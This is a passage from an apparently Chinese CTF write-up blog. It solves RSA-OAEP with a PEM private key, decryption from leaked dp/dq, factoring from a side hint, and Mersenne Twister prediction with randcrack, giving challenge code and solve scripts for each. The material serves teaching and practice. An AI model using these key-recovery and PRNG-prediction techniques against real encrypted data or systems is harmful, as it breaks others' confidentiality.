class="hljs-comment">#x=3459082537</span><br>k=long_to_bytes(x)*<span class="hljs-number">2</span><br><span class="hljs-comment">#print(len(k))</span><br>res=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(mm),<span class="hljs-number">8</span>):<br>    buf=mm[i:i+<span class="hljs-number">8</span>]<br>    des=DES.new(k,DES.MODE_ECB)<br>    k=des.encrypt(k)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buf)):<br>        res+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(buf[j])^k[j])<br><br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><h2 id="4-ezOAEP"><a href="#4-ezOAEP" class="headerlink" title="4.ezOAEP"></a>4.ezOAEP</h2><p>描述:OAEP and PublicKeyFile</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>rsa=RSA.generate(<span class="hljs-number">1024</span>)<br>pub=rsa.export_key()<span class="hljs-comment">#生成私钥</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rsakey.pem&#x27;</span>,<span class="hljs-string">&#x27;w+&#x27;</span>)<span class="hljs-comment">#将私钥写入文件</span><br>f.write(pub.decode())<br>f.close()<br><span class="hljs-built_in">print</span>(pub)<br>key = RSA.importKey(pub)<span class="hljs-comment">#读私钥(私钥包含公钥的信息)</span><br>cipher = PKCS1_OAEP.new(key)<span class="hljs-comment">#以OAEP方式和key生成一个加密方法</span><br>ans = base64.b64encode(cipher.encrypt(flag))<span class="hljs-comment">#加密flag+base64</span><br><span class="hljs-built_in">print</span>(ans)<br><span class="hljs-comment">#bT3PZSdqkCAQ6oRu29yWF9N0sy+byIq6p5dcmy29xXAYE339gRn5cvwuwT8MVMV2bZem/o88I9fwImUUeiPhRdZGEDWqaxXwa38GkYrmWmu//7UV3SiXqiBxWx618qUYfbqfdScHpJ3JDzcq822oSB+3yNQU4vkGXvvoDx522FY=</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">-----<span class="hljs-keyword">BEGIN</span> RSA PRIVATE KEY-----<br>MIICXAIBAAKBgQCqanJSo16/kHkwnEPI6nkWl1F4s8OD6I0It6KOhpMCDb8QhJ37<br>gy0T4rZdyHzCzN<span class="hljs-regexp">/rAzC+tSgQZId7eTAPpvV9rCQtJzYH/</span><span class="hljs-number">2</span>GLGMsLe6lC92W9yVMQ<br>WiFiU0gw+KhHPRmf4QuKsY2VwsdgMoEawu0vRBS+RPAskdIvWlcktUQFKwIDAQAB<br>AoGACi0gFYo26raMXhg+vf0ubOhtT4lgh/x3i4k3tk4X8jvy6GAa9P1w0CquHCyQ<br>Mqu8RVLj8sdrlIsEQh3K/mxIZXcU6kzxf3OPbja8F1GA6TzBoiWIAHwMpmFYiuaA<br>ihtkFB1j9fQpqxodr+<span class="hljs-number">5</span>iYaJP5jRa8MFn7rZp48jSvcu8500CQQC1l06CI0iD95O8<br>TRmd4c9mNyvFRXz583JLXiMqm2XK0DmmN6kgsSB1vrPzLuAwTN5GP49fXNtCrheJ<br><span class="hljs-number">4</span>A+iqgqNAkEA8D7e2a4EMkFkKuukPueeobUicMMqYcX3Og9CO1ROZiPiOaUvbxEI<br>wm8kR0gF3l<span class="hljs-regexp">/IpqAoTMmSPkHgXIx/</span>cCn8lwJAInSCJfkx4jBQrNLoQGe/JYLkYDru<br>GrMRhbFn9MalitT1i09WXOie4xh7JnJHgYKkTinzN0H0LHPB7ZxA+zlOZQJAaIfC<br>aM45TzB6h949eY1HzS5FzPBt6Vq8Zgurkqrs7a4hSVmhGN89g3PeQhGJVCcy46T9<br>w+NUeTgqibor3L64AwJBAJv4RJhAZ1VS5I545MkDth+CnTMeGokJ04S7R7K680gR<br>Cp32SG4Y1RUh2FCRxXrde/RRxchM1r7Ms9dC4YfBHLU=<br>-----<span class="hljs-keyword">END</span> RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>思路：其实这题没什么，就是格式问题，私钥的格式是以pem的格式给出的</p><p>pem密钥格式的解析方法：</p><ol><li>删除页眉、页脚和新行。</li><li>将 Base64 编码的字符串解码为其对应的16进制格式,对应的标签头后接对应的数据，具体可以看博客(<a href="http://t.csdn.cn/gq3uL">http://t.csdn.cn/gq3uL</a>)</li></ol><p>也可以通过一些模块去自动解析</p><p>相关模块详解：<a href="https://www.jb51.net/article/245425.htm">https://www.jb51.net/article/245425.htm</a></p><p>exp1:(利用rsa模块解析pem密钥文件)</p><p>开始我是使用rsa模块解析出n,e,p,q,然后再去写一个脚本解密,之后发现能单独读出来对应数据,就把两个脚本合了一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">import</span> rsa<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rsakey.pem&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> privatefile:<br>keydata=privatefile.read()<br>privkey=rsa.PrivateKey.load_pkcs1(keydata)<br>private_key = RSA.construct((privkey.n, privkey.e, privkey.d, privkey.p, privkey.q))<br>decipher = PKCS1_OAEP.new(private_key)<br><br>crypto=<span class="hljs-string">&#x27;bT3PZSdqkCAQ6oRu29yWF9N0sy+byIq6p5dcmy29xXAYE339gRn5cvwuwT8MVMV2bZem/o88I9fwImUUeiPhRdZGEDWqaxXwa38GkYrmWmu//7UV3SiXqiBxWx618qUYfbqfdScHpJ3JDzcq822oSB+3yNQU4vkGXvvoDx522FY=&#x27;</span><br><br>c = base64.b64decode(crypto)<br>flag = decipher.decrypt(c)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>exp2:(利用Crypto.PublicKey.RSA模块解析pem密钥文件)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rsakey.pem&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> x:<br>    private_key = RSA.importKey(x.read())<br>oaep=PKCS1_OAEP.new(private_key)<br><br>chiper=<span class="hljs-string">&#x27;bT3PZSdqkCAQ6oRu29yWF9N0sy+byIq6p5dcmy29xXAYE339gRn5cvwuwT8MVMV2bZem/o88I9fwImUUeiPhRdZGEDWqaxXwa38GkYrmWmu//7UV3SiXqiBxWx618qUYfbqfdScHpJ3JDzcq822oSB+3yNQU4vkGXvvoDx522FY=&#x27;</span><br>chiper=base64.b64decode(chiper)<br>flag=oaep.decrypt(chiper)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="5-leak2"><a href="#5-leak2" class="headerlink" title="5. leak2"></a>5. leak2</h2><p>描述：私钥泄露2<br>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">m:<span class="hljs-built_in">bytes</span>,n:<span class="hljs-built_in">int</span></span>):<br>    m=m.decode()+<span class="hljs-string">&#x27;@&#x27;</span>*n<br>    <span class="hljs-keyword">return</span> m.encode()<br><br>p=getPrime(<span class="hljs-number">512</span>)<br>q=getPrime(<span class="hljs-number">512</span>)<br>e=getPrime(<span class="hljs-number">128</span>)<br>n=p*q<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gp.invert(e,phi)<br>dp=d%(p-<span class="hljs-number">1</span>)<br>dq=d%(q-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;dp=&#x27;</span>,dp)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;dq=&#x27;</span>,dq)<br>flag=pad(flag,<span class="hljs-number">64</span>)  <span class="hljs-comment"># you need to know why i do padding  ;)</span><br>m=bytes_to_long(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,<span class="hljs-built_in">pow</span>(m,e,n))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=&#x27;</span>,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;q=&#x27;</span>,q)<br><span class="hljs-comment"># dp= 2903541187544738382065967909245129327519456660695355291375063703123198077478837260319274966431855803077644571641056420552550105788514871176194389042987787</span><br><span class="hljs-comment"># dq= 2927648225198252926471322195628471601111584833424878738026027884213323704585442725872918187878523820706174401779163725588724220720322246781954386922981403</span><br><span class="hljs-comment"># n= 82440554416765051495725444533506385820420641608063575154342985504861804675392925055750080193227953376053163175211070112475867785005641677405135212320550827669083859069446248590383385125807376475242236685918119242778336158932862388748489544084766252430137377711787366891943581977034327728228829242026700546887</span><br><span class="hljs-comment"># c= 1115234762560839602872367694424849684037025748836045601045936239447423778119684299244440114550444423331645611045224233478137886788605656418412698612390154517526623981801257179630392575701768854469524869450726453237538740528088121750621637260984417266049611873690762385552606982676063656239961027989816569367</span><br><span class="hljs-comment"># p= 11228596597753481897883819253715139599349672284033654438967689319299179270064856717689348853170006242794598916261727079852338768563486867042590351419925469</span><br><span class="hljs-comment"># q= 7342017651008945058616992194869993535097708966167742155909420911473302209474944777058485518104231152585539841832789007586682815851066018454289752054231923</span><br></code></pre></td></tr></table></figure><p>思路1(我自己拿到这道题的思路):</p><p>已知如下两个式子，看起来可以用中国剩余定理去解d,求出d,能通过求逆得到e</p><script type="math/tex; mode=display">\begin{cases}d\equiv{dp}(mod(p-1)) \\d\equiv{dq}(mod(q-1))\end{cases}</script><p>exp:(省事直接使用crt模块去解)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br>dp= <span class="hljs-number">2903541187544738382065967909245129327519456660695355291375063703123198077478837260319274966431855803077644571641056420552550105788514871176194389042987787</span><br>dq= <span class="hljs-number">2927648225198252926471322195628471601111584833424878738026027884213323704585442725872918187878523820706174401779163725588724220720322246781954386922981403</span><br>n= <span class="hljs-number">82440554416765051495725444533506385820420641608063575154342985504861804675392925055750080193227953376053163175211070112475867785005641677405135212320550827669083859069446248590383385125807376475242236685918119242778336158932862388748489544084766252430137377711787366891943581977034327728228829242026700546887</span><br>c= <span class="hljs-number">1115234762560839602872367694424849684037025748836045601045936239447423778119684299244440114550444423331645611045224233478137886788605656418412698612390154517526623981801257179630392575701768854469524869450726453237538740528088121750621637260984417266049611873690762385552606982676063656239961027989816569367</span><br>p= <span class="hljs-number">11228596597753481897883819253715139599349672284033654438967689319299179270064856717689348853170006242794598916261727079852338768563486867042590351419925469</span><br>q= <span class="hljs-number">7342017651008945058616992194869993535097708966167742155909420911473302209474944777058485518104231152585539841832789007586682815851066018454289752054231923</span><br><br>d,_=crt([p-<span class="hljs-number">1</span>,q-<span class="hljs-number">1</span>],[dp,dq])<br>flag=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(flag))<br></code></pre></td></tr></table></figure><p>思路2(参考其他师傅博客上的思路):</p><p>c ≡ m^e (mod n) ①<br>m ≡ c^d (mod n) ②<br>dp ≡ d (mod (p-1)) ③<br>dq ≡ d (mod (q-1)) ④</p><p>由②式可以衍生出两个式子：</p><p>m1=c^d%p<br>m2=c^d%q</p><p>分别同时对q,p取余得：<br>m1=(c^d)%p⑤<br>m2=(c^d)%q⑥</p><p>由式⑤可得m1+kp=c^d，代入⑥中可得：<br>kp≡(m2-m1) (mod q)</p><p>又因为gcd(p,q)=1</p><p>所以，k≡p’(m2-m1)(mod q)</p><p>其中，p’是p关于q的逆元</p><p>回代得 c^d=m1+(p’(m2-m1)%q )*p</p><p>由⑤及欧几里得定理得：m1=(c^dp)%p<br>同理由⑥得：m2=(c^dq)%q</p><p>最后就可以得到c^d的值从而解出m</p><p>exp2:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>dp= <span class="hljs-number">2903541187544738382065967909245129327519456660695355291375063703123198077478837260319274966431855803077644571641056420552550105788514871176194389042987787</span><br>dq= <span class="hljs-number">2927648225198252926471322195628471601111584833424878738026027884213323704585442725872918187878523820706174401779163725588724220720322246781954386922981403</span><br>n= <span class="hljs-number">82440554416765051495725444533506385820420641608063575154342985504861804675392925055750080193227953376053163175211070112475867785005641677405135212320550827669083859069446248590383385125807376475242236685918119242778336158932862388748489544084766252430137377711787366891943581977034327728228829242026700546887</span><br>c= <span class="hljs-number">1115234762560839602872367694424849684037025748836045601045936239447423778119684299244440114550444423331645611045224233478137886788605656418412698612390154517526623981801257179630392575701768854469524869450726453237538740528088121750621637260984417266049611873690762385552606982676063656239961027989816569367</span><br>p= <span class="hljs-number">11228596597753481897883819253715139599349672284033654438967689319299179270064856717689348853170006242794598916261727079852338768563486867042590351419925469</span><br>q= <span class="hljs-number">7342017651008945058616992194869993535097708966167742155909420911473302209474944777058485518104231152585539841832789007586682815851066018454289752054231923</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dpdq</span>(<span class="hljs-params">dp,dq,p,q,c</span>):<br>    n = p*q<br>    m1 = gmpy2.powmod(c,dq,q)<br>    m2 = gmpy2.powmod(c,dp,p)<br>    qi = gmpy2.invert(q,p)<br>    m = (m1+(((m2-m1)*qi)%p)*q)%n<br><br>    <span class="hljs-keyword">return</span> long_to_bytes(m)<br>f=dpdq(dp,dq,p,q,c)<br><span class="hljs-built_in">print</span>(f)<br></code></pre></td></tr></table></figure><h2 id="6-factor"><a href="#6-factor" class="headerlink" title="6.factor"></a>6.factor</h2><p>描述：factor is the basic skill</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">720</span>)<br>q = getPrime(<span class="hljs-number">720</span>)<br>n = p * q<br>r1 = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>)<br>r2 = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>)<br>hint = (p - r1)**<span class="hljs-number">2</span> + (q - r2)**<span class="hljs-number">2</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;r1=&#x27;</span>,r1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;r2=&#x27;</span>,r2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint=&#x27;</span>,hint)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br><span class="hljs-comment"># r1= 293</span><br><span class="hljs-comment"># r2= 774</span><br><span class="hljs-comment"># hint= 52847806953240356994623158084577386207041263808863983909408745491548417414157086203981431544154613834254396810648923304287690974635543563853047602289625108510771223287018791308686410243837238120013825801339538142257727108629427802985129377877413793410795213265815309648939018994006140613302004548308301095455093676888958031783578263598966738971795811613189785984063007875655427239136316391714645109226390557682186152214137855871696769</span><br><span class="hljs-comment"># n= 26420377984769144881325302475685234453215993166956333719165002225880222269537103633397071638300142847079228672931688717996058350564362047565355164961664444832383834567107557701911404434434874666210705396643111799373607616676690290731666632399162004303985798698278827451377609871878080368202175495761181466238427996828685068983408289875305593329176522173700629606164535910878860237950860401318893420613449878352040795125879097879388819</span><br><span class="hljs-comment"># c= 15070744763197189866117590576252205356249205773502832107224136811274616397347822520798572347561486151151824504958335049386216975093756118152559214420951352676553633215473184359990757679558798495157428776783375153779531018615547395962187145097344692725210935544657764249128675773481585888419258581441764946938986240988707944322222661074274640467088072474174530627671363716620619682924353778142310375353156439705172208954493766506194492</span><br><br><br></code></pre></td></tr></table></figure><p>思路：</p><p>hint给出了p,q的一组关系，加上n=p*q，两个未知数两个方程，求解即可，开始想用sage，但是一直跑不出来，用python z3库就好了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>p=Int(<span class="hljs-string">&#x27;p&#x27;</span>)<br>q=Int(<span class="hljs-string">&#x27;q&#x27;</span>)<br>s=Solver()<br>s.add(p*q==<span class="hljs-number">26420377984769144881325302475685234453215993166956333719165002225880222269537103633397071638300142847079228672931688717996058350564362047565355164961664444832383834567107557701911404434434874666210705396643111799373607616676690290731666632399162004303985798698278827451377609871878080368202175495761181466238427996828685068983408289875305593329176522173700629606164535910878860237950860401318893420613449878352040795125879097879388819</span>)<br>s.add((p - <span class="hljs-number">293</span>)**<span class="hljs-number">2</span> + (q - <span class="hljs-number">774</span>)**<span class="hljs-number">2</span>==<span class="hljs-number">52847806953240356994623158084577386207041263808863983909408745491548417414157086203981431544154613834254396810648923304287690974635543563853047602289625108510771223287018791308686410243837238120013825801339538142257727108629427802985129377877413793410795213265815309648939018994006140613302004548308301095455093676888958031783578263598966738971795811613189785984063007875655427239136316391714645109226390557682186152214137855871696769</span>)<br>s.check()<br>result=s.model()<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#p=5098262078962037003601242128735804212325920575194966152245750904415111290434255051176008617814037104844184109361522022589610589855633294838054799587967714890213138267374290624617778266505506458650738300615938813719143</span><br><span class="hljs-comment">#q=5182232214737009000323478775748857914380492534557757896756351619767259096255618579080975678284378241673437758828422827804713845230997602313185187407556885375039648428790230578302465652319393764923446509852586838588173</span><br></code></pre></td></tr></table></figure><h2 id="7-RandCrack"><a href="#7-RandCrack" class="headerlink" title="7.RandCrack"></a>7.RandCrack</h2><p>描述：MT19973 is not security</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python3</span><br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span>  flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>e = <span class="hljs-number">0x10001</span><br>common_p = next_prime(getrandbits(<span class="hljs-number">64</span>))<br>common_q = next_prime(getrandbits(<span class="hljs-number">64</span>))<br>common_n = common_p*common_q<br>common = <span class="hljs-string">&#x27;(%d,%d)&#x27;</span> % (common_n, e)<br><span class="hljs-built_in">print</span>(common)<br><span class="hljs-comment"># (219877546370517990751590059202563484101,65537)</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>test = [getrandbits(<span class="hljs-number">64</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> test:<br>    f.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">pow</span>(i, e, common_n))+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>top_p = next_prime(getrandbits(<span class="hljs-number">1024</span>))<br>top_q = next_prime(getrandbits(<span class="hljs-number">1024</span>))<br>top_n = top_p*top_q<br>top = <span class="hljs-string">&#x27;(%d,%d)&#x27;</span> % (top_n, e)<br><br>m=bytes_to_long(flag)<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;top_secret&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(top+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>f.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">pow</span>(m, e, top_n)))<br></code></pre></td></tr></table></figure><p>思路：</p><p>解题关键在于random.getrandbits()函数</p><p>官方文档解释</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">random<span class="hljs-selector-class">.getrandbits</span>(k)<br>返回具有 k 个随机比特位的非负 Python 整数。 此方法随 Mersenne Twister 生成器一起提供，其他一些生成器也可能将其作为 API 的可选部分提供。 在可能的情况下，<span class="hljs-built_in">getrandbits</span>() 会启用 <span class="hljs-built_in">randrange</span>() 来处理任意大的区间。<br>在 <span class="hljs-number">3.9</span> 版更改: 此方法现在接受零作为 k 的值。<br></code></pre></td></tr></table></figure><p>漏洞是因为Mersenne Twister生成器是不安全的：</p><p>MT19937能做生成在 1≤k≤623 个32位均匀分布的随机数，如果生成64位随机数，那么会先生成一个32位随机数a，然后再生成一个32位随机数b，将b左移32位去加上a，得到一个64位的随机数。96位的生成同理。利用randcrack库可以在知道624个32位随机数后预测下一个。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile">randcrack<br>工作原理<br>该生成器基于MersenneTwister MersenneTwisterMersenneTwister（梅森算法），能够生成具有优异统计特性的数字（与真正的随机数无法区分）。但是，此生成器的设计目的不是加密安全的。您不应在关键应用程序中用作加密方案的PRNG。<br><span class="hljs-section">工作原理如下:</span><br>它从生成器获得前624个32位数字，并获得Mersenne Twister矩阵的最可能状态，即内部状态。从这一点来看，发电机应该与裂解器同步。<br>如何使用<br>将生成器生成的32位整数准确地输入cracker非常重要，因为它们无论如何都会生成，但如果您不请求它们，则会删除它们。 同样，您必须在出现新种子之后，或者在生成624∗32位之后，准确地为破解程序馈电，因为每个624∗32位数字生成器都会改变其状态，并且破解程序设计为从某个状态开始馈电。<br></code></pre></td></tr></table></figure><p>需要注意的是必须是前624个，因为生成器的状态在每624*32个后就会发生变化，这一题就考到了这个点，题目生成的是512个64位的，也就是有1024个32位的，但我们只需要最后的624个32位的，也就是说只要最后的312行，前面200行删了就行。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack<br>n1=<span class="hljs-number">219877546370517990751590059202563484101</span><br>P1= <span class="hljs-number">14697342479840190421</span><br>P2= <span class="hljs-number">14960360804826860081</span><br>phi1=(P1-<span class="hljs-number">1</span>)*(P2-<span class="hljs-number">1</span>)<br>e=<span class="hljs-number">0x10001</span><br>d1=gmpy2.invert(e,phi1)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    l = 